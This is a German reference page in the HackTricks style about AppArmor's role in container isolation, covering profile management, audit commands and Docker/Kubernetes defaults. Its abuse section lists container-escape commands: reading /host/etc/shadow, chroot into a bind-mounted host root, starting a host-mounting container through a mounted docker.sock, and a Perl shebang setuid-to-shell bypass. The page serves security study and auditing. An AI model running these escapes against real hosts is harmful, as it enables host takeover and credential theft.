# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Rolle bei der Container-Isolation

AppArmor ist ein **Mandatory Access Control**-System, das Einschränkungen über Profile pro Programm anwendet. Im Gegensatz zu herkömmlichen DAC-Prüfungen, die stark von Benutzer- und Gruppenzugehörigkeiten abhängen, kann der Kernel mit AppArmor eine Richtlinie durchsetzen, die an den Prozess selbst gebunden ist. In Container-Umgebungen ist das wichtig, weil ein Workload möglicherweise über ausreichende herkömmliche Berechtigungen verfügt, um eine Aktion zu versuchen, und dennoch abgewiesen wird, weil sein AppArmor-Profil den betreffenden Pfad, das Mount-Verhalten, das Netzwerkverhalten oder die Verwendung einer Capability nicht erlaubt.

Der wichtigste konzeptionelle Punkt ist, dass AppArmor **pfadbasiert** ist. Der Zugriff auf das Dateisystem wird über Pfadregeln und nicht über Labels wie bei SELinux bewertet. Dadurch ist AppArmor zugänglich und leistungsfähig, aber es bedeutet auch, dass Bind Mounts und alternative Pfadstrukturen sorgfältig berücksichtigt werden müssen. Wenn derselbe Host-Inhalt unter einem anderen Pfad erreichbar wird, entspricht die Wirkung der Richtlinie möglicherweise nicht dem, was der Operator zunächst erwartet hat.

## Rolle bei der Container-Isolation

Bei Sicherheitsüberprüfungen von Containern werden Capabilities und seccomp oft als ausreichend betrachtet, aber AppArmor bleibt auch nach diesen Prüfungen relevant. Stell dir einen Container vor, der über mehr Berechtigungen verfügt als vorgesehen, oder einen Workload, der aus betrieblichen Gründen eine zusätzliche Capability benötigt. AppArmor kann weiterhin den Dateizugriff, das Mount-Verhalten, das Networking und Ausführungsmuster einschränken und dadurch den offensichtlichen Missbrauchspfad blockieren. Deshalb kann das Deaktivieren von AppArmor „nur damit die Anwendung funktioniert“ eine lediglich riskante Konfiguration unbemerkt in eine aktiv ausnutzbare verwandeln.

## Lab

Um zu prüfen, ob AppArmor auf dem Host aktiv ist, verwende:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Um zu sehen, unter welchem Benutzer der aktuelle Container-Prozess ausgeführt wird:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Der Unterschied ist aufschlussreich. Im Normalfall sollte der Prozess einen AppArmor-Kontext anzeigen, der an das vom runtime ausgewählte Profil gebunden ist. Im unconfined-Fall entfällt diese zusätzliche Einschränkungsebene.

Du kannst auch überprüfen, was Docker nach eigener Einschätzung angewendet hat:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Laufzeitverwendung

Docker kann ein standardmäßiges oder benutzerdefiniertes AppArmor-Profil anwenden, wenn der Host dies unterstützt. Podman kann ebenfalls in AppArmor auf AppArmor-basierten Systemen integriert werden, obwohl auf SELinux-first-Distributionen das andere MAC-System oft im Mittelpunkt steht. Kubernetes kann AppArmor-Richtlinien auf Workload-Ebene auf Nodes bereitstellen, die AppArmor tatsächlich unterstützen. LXC und verwandte Ubuntu-Familien-System-Container-Umgebungen verwenden AppArmor ebenfalls umfassend.

Der praktische Punkt ist, dass AppArmor kein „Docker-Feature“ ist. Es handelt sich um eine Host-Kernel-Funktion, die mehrere Runtimes anwenden können. Wenn der Host dies nicht unterstützt oder die Runtime angewiesen wird, unconfined auszuführen, ist der vermeintliche Schutz nicht wirklich vorhanden.

Für Kubernetes lautet die moderne API `securityContext.appArmorProfile`. Seit Kubernetes `v1.30` sind die älteren Beta-AppArmor-Annotations veraltet. Auf unterstützten Hosts ist `RuntimeDefault` das Standardprofil, während `Localhost` auf ein Profil verweist, das auf dem Node bereits geladen sein muss. Dies ist bei der Überprüfung wichtig, da ein Manifest AppArmor-bewusst wirken kann, während es dennoch vollständig von der Unterstützung des Nodes und vorab geladenen Profilen abhängt.

Ein subtiler, aber nützlicher operativer Aspekt ist, dass das explizite Setzen von `appArmorProfile.type: RuntimeDefault` strenger ist, als das Feld einfach wegzulassen. Wenn das Feld explizit gesetzt ist und der Node AppArmor nicht unterstützt, sollte die Admission fehlschlagen. Wenn das Feld weggelassen wird, kann die Workload möglicherweise trotzdem auf einem Node ohne AppArmor ausgeführt werden und erhält dann lediglich diese zusätzliche Confinement-Schicht nicht. Aus Sicht eines Angreifers ist dies ein guter Grund, sowohl das Manifest als auch den tatsächlichen Zustand des Nodes zu überprüfen.

Auf Docker-fähigen AppArmor-Hosts ist `docker-default` das bekannteste Standardprofil. Dieses Profil wird aus Mobys AppArmor-Template generiert und ist wichtig, weil es erklärt, warum einige auf Capabilities basierende PoCs in einem Standard-Container weiterhin fehlschlagen. Grob gesagt erlaubt `docker-default` gewöhnliches Networking, verweigert Schreibzugriffe auf große Teile von `/proc`, verweigert den Zugriff auf sensible Bereiche von `/sys`, blockiert Mount-Operationen und schränkt ptrace ein, sodass es kein allgemeines Host-Probing-Primitive darstellt. Das Verständnis dieser Baseline hilft dabei, zwischen „der Container verfügt über `CAP_SYS_ADMIN`“ und „der Container kann diese Capability tatsächlich gegen die Kernel-Interfaces einsetzen, die mich interessieren“ zu unterscheiden.

## Profilverwaltung

AppArmor-Profile werden normalerweise unter `/etc/apparmor.d/` gespeichert. Eine gängige Namenskonvention besteht darin, Schrägstriche im Pfad der ausführbaren Datei durch Punkte zu ersetzen. Ein Profil für `/usr/bin/man` wird beispielsweise üblicherweise unter `/etc/apparmor.d/usr.bin.man` gespeichert. Dieses Detail ist sowohl bei der Verteidigung als auch bei der Bewertung wichtig, da sich die entsprechende Datei auf dem Host oft schnell finden lässt, sobald der Name des aktiven Profils bekannt ist.

Zu den nützlichen Verwaltungsbefehlen auf dem Host gehören:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Der Grund, warum diese Befehle in einer Referenz zur container-Security wichtig sind, liegt darin, dass sie erklären, wie Profile tatsächlich erstellt, geladen, in den complain mode versetzt und nach Änderungen an der Anwendung angepasst werden. Wenn ein Operator die Angewohnheit hat, Profile während der Fehlerbehebung in den complain mode zu versetzen und anschließend zu vergessen, die Erzwingung wieder zu aktivieren, kann der Container in der Dokumentation geschützt wirken, sich in der Realität jedoch wesentlich weniger restriktiv verhalten.

### Profile erstellen und aktualisieren

`aa-genprof` kann das Verhalten einer Anwendung beobachten und interaktiv bei der Erstellung eines Profils helfen:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` kann ein Profil-Template generieren, das später mit `apparmor_parser` geladen werden kann:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Wenn sich die Binärdatei ändert und die Policy aktualisiert werden muss, kann `aa-logprof` in Logs gefundene Denials erneut abspielen und den Operator dabei unterstützen, zu entscheiden, ob sie erlaubt oder abgelehnt werden sollen:
```bash
sudo aa-logprof
```
### Protokolle

AppArmor-Verweigerungen sind häufig über `auditd`, syslog oder Tools wie `aa-notify` sichtbar:
```bash
sudo aa-notify -s 1 -v
```
Dies ist operativ und offensiv nützlich. Defenders verwenden es, um Profile zu verfeinern. Attackers verwenden es, um herauszufinden, welcher exakte Pfad oder welche Operation verweigert wird und ob AppArmor die Control ist, die eine Exploit Chain blockiert.

### Die exakte Profildatei ermitteln

Wenn eine Runtime für einen Container einen bestimmten AppArmor-Profilnamen anzeigt, ist es oft nützlich, diesen Namen wieder der Profildatei auf dem Datenträger zuzuordnen:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Dies ist besonders bei der Überprüfung auf der Host-Seite nützlich, da es die Lücke zwischen „der Container gibt an, dass er unter dem Profil `lowpriv` läuft“ und „die tatsächlichen Regeln befinden sich in dieser spezifischen Datei, die geprüft oder neu geladen werden kann“ schließt.

### Wichtige Regeln für die Prüfung

Wenn du ein Profil lesen kannst, solltest du dich nicht auf einfache `deny`-Zeilen beschränken. Mehrere Regeltypen verändern maßgeblich, wie wirksam AppArmor gegen einen Container escape-Versuch ist:

- `ux` / `Ux`: Führt die Ziel-Binary ohne Einschränkungen aus. Wenn ein erreichbarer Helper, eine Shell oder ein Interpreter unter `ux` erlaubt ist, sollte dies normalerweise als Erstes getestet werden.
- `px` / `Px` und `cx` / `Cx`: Führen bei `exec` Profilübergänge durch. Diese sind nicht automatisch problematisch, sollten aber geprüft werden, da ein Übergang in einem deutlich umfassenderen Profil als dem aktuellen enden kann.
- `change_profile`: Erlaubt einer Task, sofort oder beim nächsten `exec` in ein anderes geladenes Profil zu wechseln. Wenn das Zielprofil schwächer ist, kann dies zum vorgesehenen escape hatch aus einer restriktiven Domain werden.
- `flags=(complain)`, `flags=(unconfined)` oder neuere `flags=(prompt)`: Diese Optionen sollten beeinflussen, wie viel Vertrauen du in das Profil setzt. `complain` protokolliert Verweigerungen, anstatt sie durchzusetzen, `unconfined` entfernt die Grenze und `prompt` hängt von einem Userspace-Entscheidungspfad statt von einer reinen, vom Kernel durchgesetzten Verweigerung ab.
- `userns` oder `userns create,`: Neuere AppArmor-Policies können die Erstellung von User Namespaces überwachen. Wenn ein Container-Profil dies ausdrücklich erlaubt, bleiben verschachtelte User Namespaces möglich, selbst wenn die Plattform AppArmor als Teil ihrer Hardening-Strategie verwendet.

Nützlicher grep-Befehl auf der Host-Seite:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Diese Art von Audit ist oft nützlicher, als Hunderte gewöhnlicher Dateiregeln zu durchsuchen. Wenn ein Breakout davon abhängt, einen Helper auszuführen, einen neuen Namespace zu betreten oder in ein weniger restriktives Profil zu wechseln, ist die Antwort häufig in diesen transitionsorientierten Regeln verborgen und nicht in den offensichtlichen Zeilen im Stil von `deny /etc/shadow r`.

## Fehlkonfigurationen

Der offensichtlichste Fehler ist `apparmor=unconfined`. Administratoren setzen dies häufig während des Debuggings einer Anwendung, die fehlgeschlagen ist, weil das Profil etwas Gefährliches oder Unerwartetes korrekt blockiert hat. Wenn das Flag in der Production-Umgebung bestehen bleibt, wurde die gesamte MAC-Schicht effektiv entfernt.

Ein weiteres, subtileres Problem besteht in der Annahme, dass Bind-Mounts harmlos sind, weil die Dateiberechtigungen normal aussehen. Da AppArmor pfadbasiert arbeitet, kann das Freigeben von Host-Pfaden unter alternativen Mount-Pfaden problematisch mit den Pfadregeln interagieren. Ein dritter Fehler ist zu vergessen, dass ein Profilname in einer Konfigurationsdatei wenig bedeutet, wenn der Host-Kernel AppArmor nicht tatsächlich erzwingt.

## Missbrauch

Wenn AppArmor entfernt wurde, können zuvor eingeschränkte Vorgänge plötzlich funktionieren: das Lesen sensibler Pfade über Bind-Mounts, der Zugriff auf Teile von procfs oder sysfs, deren Verwendung eigentlich erschwert bleiben sollte, das Ausführen von Mount-bezogenen Aktionen, sofern Capabilities/seccomp dies ebenfalls erlauben, oder die Verwendung von Pfaden, die ein Profil normalerweise verweigern würde. AppArmor ist häufig der Mechanismus, der erklärt, warum ein auf Capabilities basierender Breakout-Versuch auf dem Papier zwar „funktionieren sollte“, in der Praxis aber trotzdem fehlschlägt. Wird AppArmor entfernt, kann derselbe Versuch plötzlich erfolgreich sein.

Wenn du vermutest, dass AppArmor das Wesentliche ist, was eine Path-Traversal-, Bind-Mount- oder Mount-basierte Missbrauchskette verhindert, besteht der erste Schritt normalerweise darin, zu vergleichen, was mit und ohne Profil zugänglich wird. Wenn beispielsweise ein Host-Pfad innerhalb des Containers gemountet ist, prüfe zunächst, ob du ihn durchqueren und lesen kannst:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Wenn der Container außerdem über eine gefährliche Capability wie `CAP_SYS_ADMIN` verfügt, besteht einer der praktischsten Tests darin zu prüfen, ob AppArmor die Kontrolle ist, die Mount-Operationen oder den Zugriff auf sensible Kernel-Dateisysteme blockiert:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
In Umgebungen, in denen ein Host-Pfad bereits über einen bind mount verfügbar ist, kann der Verlust von AppArmor ein schreibgeschütztes information-disclosure issue auch in direkten Zugriff auf Host-Dateien umwandeln:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Der Punkt dieser Befehle ist nicht, dass AppArmor allein den breakout ermöglicht. Sobald AppArmor entfernt wurde, können viele auf Dateisystemen und Mounts basierende abuse paths unmittelbar getestet werden.

### Vollständiges Beispiel: AppArmor deaktiviert + Host Root gemountet

Wenn der Container das Host Root bereits unter `/host` per Bind-Mount eingebunden hat, kann das Entfernen von AppArmor einen blockierten Dateisystem-abuse-path in einen vollständigen host escape verwandeln:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Sobald die Shell über das Host-Dateisystem ausgeführt wird, hat die Workload die Container-Grenze faktisch verlassen:
```bash
id
hostname
cat /etc/shadow | head
```
### Vollständiges Beispiel: AppArmor deaktiviert + Runtime-Socket

Wenn die tatsächliche Barriere AppArmor rund um den Runtime-Zustand war, kann ein gemounteter Socket für einen vollständigen Escape ausreichen:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Der genaue Pfad hängt vom Einhängepunkt ab, aber das Ergebnis ist dasselbe: AppArmor verhindert den Zugriff auf die runtime API nicht mehr, und die runtime API kann einen den Host kompromittierenden Container starten.

### Vollständiges Beispiel: Umgehung per pfadbasiertem Bind-Mount

Da AppArmor pfadbasiert ist, schützt die Absicherung von `/proc/**` nicht automatisch denselben procfs-Inhalt des Hosts, wenn dieser über einen anderen Pfad erreichbar ist:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Die Auswirkungen hängen davon ab, was genau eingehängt wird und ob der alternative Pfad auch andere Kontrollen umgeht. Dieses Muster ist jedoch einer der deutlichsten Gründe dafür, AppArmor zusammen mit dem Mount-Layout und nicht isoliert zu bewerten.

### Full Example: Shebang Bypass

Eine AppArmor-Richtlinie zielt manchmal auf einen Interpreter-Pfad ab, ohne die Skriptausführung durch die Shebang-Verarbeitung vollständig zu berücksichtigen. Ein historisches Beispiel betraf die Verwendung eines Skripts, dessen erste Zeile auf einen eingeschränkten Interpreter verweist:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Diese Art von Beispiel ist als Erinnerung daran wichtig, dass Profilabsicht und tatsächliche Ausführungssemantik voneinander abweichen können. Bei der Überprüfung von AppArmor in Container-Umgebungen verdienen Interpreter-Ketten und alternative Ausführungspfade besondere Aufmerksamkeit.

## Prüfungen

Das Ziel dieser Prüfungen ist, schnell drei Fragen zu beantworten: Ist AppArmor auf dem Host aktiviert, ist der aktuelle Prozess eingeschränkt, und hat die Runtime tatsächlich ein Profil auf diesen Container angewendet?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Was ist hier interessant:

- Wenn `/proc/self/attr/current` `unconfined` anzeigt, profitiert der Workload nicht von der AppArmor-Einschränkung.
- Wenn `aa-status` anzeigt, dass AppArmor deaktiviert oder nicht geladen ist, ist jeder Profilname in der Runtime-Konfiguration größtenteils kosmetisch.
- Wenn `docker inspect` `unconfined` oder ein unerwartetes benutzerdefiniertes Profil anzeigt, ist das häufig der Grund dafür, dass ein auf dem Dateisystem oder Mount basierender Abuse-Pfad funktioniert.
- Wenn `/sys/kernel/security/apparmor/profiles` das erwartete Profil nicht enthält, reicht die Konfiguration der Runtime oder des Orchestrators allein nicht aus.
- Wenn ein angeblich gehärtetes Profil Regeln im Stil von `ux`, weitreichendem `change_profile`, `userns` oder `flags=(complain)` enthält, kann die praktische Grenze deutlich schwächer sein, als der Profilname vermuten lässt.

Wenn ein Container aus betrieblichen Gründen bereits über erhöhte Berechtigungen verfügt, macht die Aktivierung von AppArmor häufig den Unterschied zwischen einer kontrollierten Ausnahme und einem deutlich umfassenderen Sicherheitsversagen.

## Runtime-Standards

| Runtime / Plattform | Standardzustand | Standardverhalten | Häufige manuelle Abschwächung |
| --- | --- | --- | --- |
| Docker Engine | Auf AppArmor-fähigen Hosts standardmäßig aktiviert | Verwendet das AppArmor-Profil `docker-default`, sofern es nicht überschrieben wird | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Vom Host abhängig | AppArmor wird über `--security-opt` unterstützt, aber der genaue Standard hängt vom Host und der Runtime ab und ist weniger universell als das dokumentierte Docker-Profil `docker-default` | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Bedingter Standard | Wenn `appArmorProfile.type` nicht angegeben ist, lautet der Standard `RuntimeDefault`; er wird jedoch nur angewendet, wenn AppArmor auf dem Node aktiviert ist | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` mit einem schwachen Profil, Nodes ohne AppArmor-Unterstützung |
| containerd / CRI-O unter Kubernetes | Folgt der Unterstützung durch Node und Runtime | Übliche von Kubernetes unterstützte Runtimes unterstützen AppArmor, die tatsächliche Durchsetzung hängt jedoch weiterhin von der Node-Unterstützung und den Workload-Einstellungen ab | Wie in der Kubernetes-Zeile; die direkte Runtime-Konfiguration kann AppArmor ebenfalls vollständig umgehen |

Bei AppArmor ist die wichtigste Variable häufig der **Host** und nicht nur die Runtime. Eine Profileinstellung in einem Manifest erzeugt keine Einschränkung auf einem Node, auf dem AppArmor nicht aktiviert ist.

## Referenzen

- [Kubernetes security context: Felder für AppArmor-Profile und Verhalten bei Node-Unterstützung](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu-24.04-Manpage `apparmor.d(5)`: exec-Transitions, `change_profile`, `userns` und Profil-Flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
